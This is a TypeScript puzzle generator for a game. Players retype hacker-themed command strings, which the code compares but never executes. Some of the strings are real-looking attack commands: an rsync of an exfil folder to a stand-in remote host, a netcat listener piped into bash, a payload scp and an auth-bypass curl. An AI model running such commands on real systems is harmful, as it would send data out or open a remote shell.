// ===== STATIC ORBIT — Hack Terminal Puzzle Generator =====

import type { Difficulty, GameAction, PuzzleType, ValidationResult } from '../../../../shared/types.js';
import type { PuzzleGenerator, PuzzleInstance } from './PuzzleGenerator.js';
import { TIME_LIMITS } from './PuzzleGenerator.js';

const EASY_COMMANDS = [
  'sudo access --port 443',
  'decrypt file_07.dat',
  'ping orbital.hub.net',
  'open vault --key alpha',
  'scan /sys/core/nodes',
  'mount drive_x --force',
  'cat /var/log/access.log',
  'kill -9 watchdog_proc',
  'chmod 777 /tmp/bypass',
  'reboot --safe-mode',
];

const NORMAL_COMMANDS = [
  'ssh root@orbital7.arktis.net --key cipher_mx',
  'scp payload.bin ghost@10.0.77.4:/drop/',
  'openssl enc -aes-256-cbc -in vault.db',
  'nmap -sV -p 1-65535 target.arktis.local',
  'curl -X POST https://api.arktis.net/auth/bypass',
  'rsync -avz /exfil/ relay@proxy3.ghost.io:/out/',
  'docker exec -it core_node /bin/sh -c "dump"',
  'iptables -A INPUT -s 0/0 -j DROP',
];

const HARD_COMMANDS = [
  'exec(0xFF){bypass.node[7]};',
  'inject --payload="$(cat /dev/urandom | head -c 32)"',
  'sys.override(auth_layer[3], mode=GHOST);',
  'for(i=0;i<nodes.length;i++){purge(nodes[i]);}',
  'SELECT * FROM arktis.secrets WHERE clearance>7;',
  'lambda x: crypto.decrypt(x, key=0xDEAD);',
  'netcat -lvp 4444 | /bin/bash 2>&1',
  'echo "R0hPU1Q=" | base64 -d > /tmp/.hidden',
];

function randomHexString(length: number): string {
  const chars = 'abcdefABCDEF0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

function randomBase64Like(length: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

function shuffle<T>(arr: T[]): T[] {
  const result = [...arr];
  for (let i = result.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [result[i], result[j]] = [result[j], result[i]];
  }
  return result;
}

function commandCountForDifficulty(difficulty: Difficulty): number {
  switch (difficulty) {
    case 'easy': return 3;
    case 'normal': return 4;
    case 'hard': return 4;
    case 'extreme': return 5;
  }
}

function displayTimeForDifficulty(difficulty: Difficulty): number {
  switch (difficulty) {
    case 'easy': return 15;
    case 'normal': return 12;
    case 'hard': return 8;
    case 'extreme': return 5;
  }
}

function generateCommands(difficulty: Difficulty, count: number): string[] {
  switch (difficulty) {
    case 'easy':
      return shuffle([...EASY_COMMANDS]).slice(0, count);
    case 'normal':
      return shuffle([...NORMAL_COMMANDS]).slice(0, count);
    case 'hard':
      return shuffle([...HARD_COMMANDS]).slice(0, count);
    case 'extreme': {
      const commands: string[] = [];
      for (let i = 0; i < count; i++) {
        const len = Math.floor(Math.random() * 8) + 12; // 12-19 chars
        commands.push(Math.random() > 0.5 ? randomHexString(len) : randomBase64Like(len));
      }
      return commands;
    }
  }
}

export class HackTerminalGenerator implements PuzzleGenerator {
  readonly type: PuzzleType = 'hack-terminal';

  generate(difficulty: Difficulty, _playerCount: number): PuzzleInstance {
    const count = commandCountForDifficulty(difficulty);
    const displayTime = displayTimeForDifficulty(difficulty);
    const commands = generateCommands(difficulty, count);

    // Track which commands have been completed
    const completedCommands = new Set<number>();

    const timeLimit = TIME_LIMITS[difficulty];

    const instance: PuzzleInstance = {
      type: this.type,
      sharedData: { commandCount: count },
      roleData: {
        observer: {
          commands,
          displayTime,
        },
        operator: {
          commandCount: count,
          currentIndex: 0,
        },
      },
      timeLimit,

      validate(action: GameAction): ValidationResult {
        if (action.action !== 'type-command') {
          return { correct: false, penalty: 0, feedback: 'Unknown action.' };
        }

        const { index, input } = action.data as { index: number; input: string };

        if (index == null || input == null) {
          return { correct: false, penalty: 0, feedback: 'Missing command index or input.' };
        }

        if (index < 0 || index >= count) {
          return { correct: false, penalty: 0, feedback: 'Invalid command index.' };
        }

        if (completedCommands.has(index)) {
          return { correct: false, penalty: 0, feedback: `Command ${index + 1} already executed.` };
        }

        if (input === commands[index]) {
          completedCommands.add(index);
          const solved = completedCommands.size === count;
          return {
            correct: true,
            penalty: 0,
            feedback: `Command ${index + 1} executed successfully.`,
            solved,
          };
        }

        return {
          correct: false,
          penalty: 10,
          feedback: `Command ${index + 1}: syntax error. Exact input required.`,
        };
      },
    };

    return instance;
  }
}
